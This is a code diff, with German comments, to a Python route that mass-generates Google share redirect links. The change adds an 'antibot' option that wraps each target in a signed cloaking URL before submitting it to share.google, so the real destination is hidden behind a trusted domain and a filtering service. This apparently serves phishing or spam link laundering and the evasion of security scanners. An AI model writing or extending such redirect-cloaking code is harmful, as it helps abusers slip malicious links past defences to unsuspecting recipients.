@@ -313,6 +313,24 @@ async def generate_redirects(request: Request,
     gen_uid = request.state.user["id"]
     do_rewrite = bool(google_rewrite)
 
+    # Antibot-Wrapping: wenn aktiv, submitten wir die antibot-URL an
+    # share.google statt der echten Ziel-URL. Google speichert dann
+    # intern die antibot-URL, der Empfänger landet über share.google
+    # auf antibot und antibot leitet auf's echte Ziel weiter.
+    cfg_snapshot = db.get_config()
+    antibot_active = (cfg_snapshot.get("antibot_enabled")
+                      and cfg_snapshot.get("antibot_base_url")
+                      and cfg_snapshot.get("antibot_hmac_secret"))
+    submit_target = target
+    if antibot_active:
+        from .antibot_config import build_antibot_url
+        submit_target = build_antibot_url(
+            cfg_snapshot["antibot_base_url"],
+            cfg_snapshot["antibot_hmac_secret"],
+            target,
+            ttl_seconds=int(cfg_snapshot.get("antibot_token_ttl_hours", 168)) * 3600,
+        )
+
     _gen_progress.update(running=True, total=count, done=0, ok=0, errors=0)
 
     def worker():
@@ -324,7 +342,7 @@ async def generate_redirects(request: Request,
             done = 0
 
             def gen_one(_):
-                return RedirectManager._generate_one(target)
+                return RedirectManager._generate_one(submit_target)
 
             with ThreadPoolExecutor(max_workers=gen_threads) as executor:
                 futures = [executor.submit(gen_one, i) for i in range(count)]
@@ -356,9 +374,10 @@ async def generate_redirects(request: Request,
     t = threading.Thread(target=worker, daemon=True)
     t.start()
     fmt_label = " (google.xx format)" if do_rewrite else ""
+    antibot_label = " · via antibot" if antibot_active else ""
     return HTMLResponse(
         f'<div class="alert alert-info">Generating {count} redirect links '
-        f'with {gen_threads} threads{fmt_label}...</div>'
+        f'with {gen_threads} threads{fmt_label}{antibot_label}...</div>'
         f'<div id="gen-progress" hx-get="/redirects/status" '
         f'hx-trigger="every 2s" hx-swap="innerHTML"></div>'
     )
